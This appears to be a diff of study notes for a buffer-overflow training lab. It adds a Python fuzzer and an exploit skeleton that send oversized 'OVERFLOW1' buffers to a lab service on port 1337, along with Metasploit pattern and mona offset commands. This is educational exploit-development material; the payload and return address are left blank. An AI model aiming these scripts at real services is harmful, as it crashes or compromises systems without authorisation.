@@ -13,62 +13,65 @@
 
 **!mona findmsp -distance <> **
 
+```
+#!/usr/bin/env python3
+
 import socket, time, sys
 
-ip = ""
-port = 
+ip = "MACHINE_IP"
+
+port = 1337
 timeout = 5
+prefix = "OVERFLOW1 "
 
-buffer = [] 
-counter = 100
-while len(buffer) < 30:
-    buffer.append(b"A" * counter)
-    counter += 100
+string = prefix + "A" * 100
 
-for string in buffer:
-   try:
-      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+while True:
+  try:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
       s.settimeout(timeout)
-      connect = s.connect((ip, port))
+      s.connect((ip, port))
       s.recv(1024)
-      print("Fuzzing with %s bytes" % len(string))
-      s.send(b"OVERFLOW1 " + string + b"\r\n")
+      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
+      s.send(bytes(string, "latin-1"))
       s.recv(1024)
-      s.close()
-
-   except:
-      print("Could not connect to " + ip + ":" + str(port))
-      sys.exit(0)
-   time.sleep(1) 
+  except:
+    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+    sys.exit(0)
+  string += 100 * "A"
+  time.sleep(1)
+```
 
 3. Control EIP, create a pattern and determine the offset. Add 400 bytes on the crashed bytes.
 
 **/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600**
 
+```
 import socket
 
-ip = ""
-port = 
+ip = "10.10.224.99"
+port = 1337
 
-prefix = b"OVERFLOW1 "
+prefix = "OVERFLOW1 "
 offset = 0
-overflow = b"A" * offset
-retn = b""
-padding = b""
-payload = b""
-postfix = b""
+overflow = "A" * offset
+retn = ""
+padding = ""
+payload = ""
+postfix = ""
 
 buffer = prefix + overflow + retn + padding + payload + postfix
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 try:
-    s.connect((ip, port))
-    print("Sending evil buffer...")
-    s.send(buffer + b"\r\n")
-    print("Done!")
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
 except:
-    print("Could not connect.")
+  print("Could not connect.")
+```
 
 **/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 600 -q **
 
